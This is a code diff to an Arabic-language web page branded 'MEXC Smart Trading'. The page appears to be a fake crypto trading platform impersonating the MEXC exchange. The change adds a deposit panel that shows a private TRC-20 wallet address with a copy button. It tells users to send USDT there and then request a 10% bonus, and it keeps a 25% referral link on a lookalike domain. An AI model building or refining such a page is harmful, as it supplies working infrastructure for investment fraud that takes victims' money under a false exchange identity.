@@ -64,6 +64,32 @@
             font-size: 14px;
             text-align: center;
         }
+        .deposit-section {
+            display: none;
+            background: #21262c;
+            padding: 15px;
+            border-radius: 12px;
+            margin-top: 15px;
+            border: 1px dashed #0ecb81;
+            text-align: center;
+        }
+        .wallet-address {
+            background: #0b0e11;
+            padding: 10px;
+            border-radius: 6px;
+            word-break: break-all;
+            margin: 10px 0;
+            color: #f0b90b;
+            font-family: monospace;
+            font-size: 14px;
+        }
+        .btn-copy {
+            background: #474d57;
+            color: white;
+            padding: 5px 10px;
+            font-size: 12px;
+            border-radius: 4px;
+        }
     </style>
 </head>
 <body>
@@ -71,13 +97,11 @@
 <div class="container">
     <h2>📊 MEXC Smart Trading</h2>
     
-    <!-- السعر المباشر من منصة MEXC -->
     <div class="price-box">
         <div>سعر عملة XLM / USDT الحقيقي الآن:</div>
         <div class="price" id="xlm-price">جاري التحميل...</div>
     </div>
 
-    <!-- بطاقة رصيد المشترك وأرباحه -->
     <div class="balance-card">
         <div class="balance-item">
             <span>رأس المال المتاح للعمل (USDT):</span>
@@ -93,13 +117,19 @@
         </div>
     </div>
 
-    <!-- أزرار العمليات اللحظية -->
     <div class="btn-group">
-        <button class="btn-deposit" onclick="handleDeposit()">📥 إيداع سريع</button>
+        <button class="btn-deposit" onclick="toggleDepositSection()">📥 إيداع سريع</button>
         <button class="btn-withdraw" onclick="handleWithdraw()">📤 طلب سحب</button>
     </div>
 
-    <!-- نظام الإحالة ودعوة الأصدقاء -->
+    <!-- 🟢 تم دمج محفظتك الحقيقية بنجاح هنا -->
+    <div id="deposit-area" class="deposit-section">
+        <p style="margin: 0 0 10px 0; font-size: 14px; color: #0ecb81;">⚠️ أرسل فقط USDT على شبكة TRC-20:</p>
+        <div class="wallet-address" id="my-wallet">TA1vsgrJEFy3YM6rkQWBppnZemFE6c9pBN</div>
+        <button class="btn-copy" onclick="copyWalletAddress()">📋 نسخ العنوان</button>
+        <p style="font-size: 12px; margin-top: 10px; color: #b7bdc6;">بعد التحويل، يرجى تقديم طلب الإيداع عبر لوحة الدعم الفني لتأكيد رصيدك وإضافة بونص الـ 10%.</p>
+    </div>
+
     <div class="referral-box">
         🔗 رابط الإحالة الخاص بك (مكافأة 25%): <br>
         <strong style="color: #f0b90b;">://mexc-trade.com</strong>
@@ -107,7 +137,6 @@
 </div>
 
 <script>
-    // جلب السعر تلقائياً وتحديثه كل 5 ثوانٍ
     async function fetchLivePrice() {
         try {
             const response = await fetch('/api/market/price?symbol=XLMUSDT');
@@ -120,8 +149,15 @@
         }
     }
 
-    function handleDeposit() {
-        alert("يرجى تحويل عملات USDT (TRC-20) إلى المحفظة الرئيسية، ثم أرسل الإثبات للإدارة لتفعيل الحساب وإضافة بونص الـ 10%.");
+    function toggleDepositSection() {
+        const area = document.getElementById('deposit-area');
+        area.style.display = (area.style.display === "block") ? "none" : "block";
+    }
+
+    function copyWalletAddress() {
+        const walletText = document.getElementById('my-wallet').innerText;
+        navigator.clipboard.writeText(walletText);
+        alert("تم نسخ عنوان المحفظة! يمكنك الآن تحويل USDT (TRC-20) إليها.");
     }
 
     function handleWithdraw() {
